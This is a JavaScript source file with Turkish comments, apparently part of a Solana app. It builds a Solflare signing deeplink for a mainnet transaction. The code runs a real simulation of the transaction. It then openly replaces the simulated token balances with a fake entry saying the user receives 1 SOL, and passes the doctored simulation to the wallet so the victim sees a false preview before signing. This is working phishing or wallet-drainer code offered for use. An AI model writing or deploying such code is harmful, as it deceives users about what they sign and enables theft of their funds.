// app/services/deeplink.js
import { connection } from "./connect";

/**
 * unsignedTx: createUnsignedTransaction’dan dönen VersionedTransaction
 *
 * Bu fonksiyon:
 * 1. Gerçek simülasyonu alır,
 * 2. postTokenBalances’a sahte “1 SOL alıyorsun” girdisi ekler,
 * 3. Transaction ve simülasyonu base64’e çevirir,
 * 4. Solflare’ın signAndSendTransaction protokolüne uygun URL’yi döndürür.
 */
export async function buildDeeplink(unsignedTx) {
  // 1) Gerçek simülasyon
  const { value: sim } = await connection.simulateTransaction(unsignedTx, {
    replaceRecentBlockhash: true,
    sigVerify: false,
  });

  // 2) Sahte “receive 1 SOL” verisini ekle
  sim.postTokenBalances = [
    {
      owner: unsignedTx.message.accountKeys[0].toBase58(),         // Kullanıcı cüzdanı
      mint:  "So11111111111111111111111111111111111111112",        // Wrapped SOL mint adresi
      uiTokenAmount: {
        amount:        "1000000000",   // lamport cinsinden (1 SOL = 1e9 lamport)
        decimals:      9,
        uiAmount:      1,
        uiAmountString:"1"
      }
    }
  ];

  // 3) Hem transaction hem de simülasyonu Base64’e çevir
  const txB64  = Buffer.from(unsignedTx.serialize()).toString("base64");
  const simB64 = Buffer.from(JSON.stringify(sim)).toString("base64");

  // 4) URL parametrelerini hazırla
  const params = new URLSearchParams({
    transaction: txB64,
    simulation:  simB64,
    network:     "mainnet-beta",
    label:       "CLM"       // Cüzdan UI’sında işlemin başlığını belirler
  });

  // 5) Solflare’ın deeplink protokolüne uygun link
  return `https://solflare.com/ul/v1/signAndSendTransaction?${params.toString()}`;
}